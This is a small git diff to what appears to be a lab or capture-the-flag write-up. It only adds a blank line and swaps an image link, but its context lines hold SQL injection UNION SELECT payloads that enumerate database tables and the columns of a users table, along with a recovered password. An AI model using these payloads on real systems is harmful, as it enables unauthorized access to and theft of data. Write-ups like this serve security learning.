@@ -163,6 +163,7 @@ a" UNION SELECT group_concat(table_name),2,3,4 FROM information_schema.tables wh
 ```
 a" UNION SELECT group_concat(column_name),2,3,4 FROM information_schema.columns where table_name = 'users' -- -
 ```
+
 ![image-20220906211029594](../../.gitbook/assets/image-20220906211029594.png)
 
 ```
@@ -287,4 +288,4 @@ Password: 'S8Y389KJqWpJuSwFqFZHwfZ3GnegUa'
 
 ```
 
-![image-20220906212901154](../../.gitbook/assets/image-20220906212901154.png)
+![image-20230208150110049](../../.gitbook/assets/image-20230208150110049.png)
